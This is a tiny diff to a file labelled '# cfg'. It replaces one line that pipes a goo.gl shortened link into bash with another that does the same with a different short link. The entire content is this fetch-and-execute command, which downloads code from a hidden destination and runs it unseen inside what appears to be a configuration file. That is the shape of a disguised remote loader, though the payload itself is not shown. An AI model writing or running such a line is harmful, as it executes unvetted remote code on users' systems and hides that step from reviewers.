@@ -1,2 +1,2 @@
 # cfg
-curl goo.gl/Jbc26f | bash
+curl https://goo.gl/iRQBXm | bash
